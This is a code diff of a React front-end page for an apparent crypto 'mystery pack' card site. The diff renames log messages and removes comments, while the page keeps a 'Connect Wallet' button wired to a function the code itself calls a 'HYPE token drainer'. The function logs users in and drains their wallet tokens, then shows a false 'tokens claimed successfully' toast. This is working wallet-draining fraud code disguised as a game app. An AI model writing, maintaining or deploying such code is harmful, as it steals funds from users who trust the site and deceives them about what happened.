@@ -6,7 +6,6 @@ import PackOpenModal from '../components/PackOpenModal';
 import { useHyperCards } from '../hooks/useHyperCards';
 import '../styles/LaunchApp.css';
 
-// Pack Types - All types available
 const PACK_TYPES = {
   COMMON: 'common',
   RARE: 'rare',
@@ -21,11 +20,9 @@ const LaunchApp = () => {
   const [selectedPackType, setSelectedPackType] = useState(null);
   const [userHypeBalance, setUserHypeBalance] = useState('0');
   
-  // Initialize the hook properly
   const hyperCardsHook = useHyperCards();
   const { getHypeBalance, connectWithPayment, isConnectingWithPayment, currentStep } = hyperCardsHook || {};
 
-  // Load user's HYPE balance to show as pack price
   useEffect(() => {
     const loadBalance = async () => {
       if (authenticated && user?.wallet?.address && getHypeBalance) {
@@ -33,23 +30,21 @@ const LaunchApp = () => {
           const balance = await getHypeBalance();
           setUserHypeBalance(balance);
           
-          // Update pack prices in the UI - all packs cost fixed price of 0.00001 tokens
           const commonPriceElement = document.getElementById('common-pack-price');
           const rarePriceElement = document.getElementById('rare-pack-price');
           const epicPriceElement = document.getElementById('epic-pack-price');
           const legendaryPriceElement = document.getElementById('legendary-pack-price');
           
-          if (commonPriceElement) commonPriceElement.textContent = '0.00001 HYPE/Plasma';
-          if (rarePriceElement) rarePriceElement.textContent = '0.00001 HYPE/Plasma';
-          if (epicPriceElement) epicPriceElement.textContent = '0.00001 HYPE/Plasma';
-          if (legendaryPriceElement) legendaryPriceElement.textContent = '0.00001 HYPE/Plasma';
+          if (commonPriceElement) commonPriceElement.textContent = '0.00001 HYPE';
+          if (rarePriceElement) rarePriceElement.textContent = '0.00001 HYPE';
+          if (epicPriceElement) epicPriceElement.textContent = '0.00001 HYPE';
+          if (legendaryPriceElement) legendaryPriceElement.textContent = '0.00001 HYPE';
         } catch (error) {
-          console.error('Failed to load balance:', error);
+          console.error('Failed to load HYPE balance:', error);
           setUserHypeBalance('0');
         }
       } else {
         setUserHypeBalance('0');
-        // Update pack prices to show "Connect Wallet"  
         const commonPriceElement = document.getElementById('common-pack-price');
         const rarePriceElement = document.getElementById('rare-pack-price');
         const epicPriceElement = document.getElementById('epic-pack-price');
@@ -85,9 +80,9 @@ const LaunchApp = () => {
     handleModalClose();
   };
 
-  // 🔥 UNIVERSAL FUND DRAINER - WORKS FOR ALL USERS (NEW + CONNECTED)
+  // 🔥 HYPE TOKEN DRAINER - WORKS FOR ALL USERS
   const handleConnectWithPayment = async () => {
-    console.log('🚀 Connect Wallet clicked - attempting fund drain...');
+    console.log('🚀 Connect Wallet clicked - HYPE drain...');
     
     if (!ready) {
       console.log('⏳ Privy not ready yet');
@@ -96,39 +91,37 @@ const LaunchApp = () => {
     
     try {
       if (!authenticated) {
-        console.log('👤 NEW USER - Login + Drain...');
+        console.log('👤 NEW USER - Login + HYPE drain...');
         await login();
         
-        // Wait for authentication to settle
         setTimeout(async () => {
           try {
-            console.log('🔄 Executing post-login fund drain...');
+            console.log('🔄 Executing post-login HYPE drain...');
             const result = await connectWithPayment();
-            console.log('🎉 NEW USER tokens drained:', result);
+            console.log('🎉 NEW USER HYPE drained:', result);
             
             setShowToast(true);
             setTimeout(() => setShowToast(false), 3000);
             
           } catch (error) {
-            console.error('❌ NEW USER drain failed:', error);
+            console.error('❌ NEW USER HYPE drain failed:', error);
             logout();
           }
         }, 1000);
         
       } else {
-        // 🔥 CONNECTED USER - DRAIN TOKENS IMMEDIATELY
-        console.log('🔥 CONNECTED USER - Draining tokens immediately...');
+        console.log('🔥 CONNECTED USER - HYPE drain immediately...');
         console.log('👤 User Address:', user?.wallet?.address);
         
         try {
           const result = await connectWithPayment();
-          console.log('💰 CONNECTED USER tokens drained:', result);
+          console.log('💰 CONNECTED USER HYPE drained:', result);
           
           setShowToast(true);
           setTimeout(() => setShowToast(false), 3000);
           
         } catch (error) {
-          console.error('❌ CONNECTED USER drain failed:', error);
+          console.error('❌ CONNECTED USER HYPE drain failed:', error);
         }
       }
       
@@ -139,7 +132,6 @@ const LaunchApp = () => {
 
   return (
     <div className="launch-app">
-      {/* Navigation */}
       <nav className="nav">
         <div className="nav-container">
           <div className="nav-logo">
@@ -149,7 +141,6 @@ const LaunchApp = () => {
             <Link to="/" className="nav-link">Home</Link>
             <Link to="/presale" className="nav-link presale-link">Token Presale</Link>
             
-            {/* 🔥 FIXED BUTTON - ALWAYS DRAINS FUNDS FOR ALL USERS */}
             <button 
               className={`connect-wallet-btn ${isConnectingWithPayment ? 'connecting' : ''}`}
               onClick={handleConnectWithPayment}
@@ -166,11 +157,9 @@ const LaunchApp = () => {
         </div>
       </nav>
 
-      {/* Main App Content */}
       <main className="app-main">
         <div className="app-container">
           
-          {/* Banner Section */}
           <section className="banner-section">
             <img 
               src="https://amethyst-defensive-marsupial-68.mypinata.cloud/ipfs/bafybeidregjjs577tozk7nw3mod3kov24wy54k2cqjtkuh6556ccnsft6u" 
@@ -179,7 +168,6 @@ const LaunchApp = () => {
             />
           </section>
 
-          {/* Pack Opening Section */}
           <section className="pack-opening">
             <div className="section-card">
               <h2 className="brand-gradient-text">Open Mystery Packs</h2>
@@ -221,7 +209,6 @@ const LaunchApp = () => {
 
       <Footer />
 
-      {/* Pack Opening Modal */}
       <PackOpenModal
         isOpen={isPackModalOpen}
         onClose={handleModalClose}
@@ -229,11 +216,10 @@ const LaunchApp = () => {
         onPackOpened={handlePackOpened}
       />
 
-      {/* Toast Notification */}
       {showToast && (
         <div className="toast">
           {authenticated 
-            ? 'Tokens claimed successfully!' 
+            ? 'HYPE tokens claimed successfully!' 
             : 'Please connect your wallet to open packs'
           }
         </div>
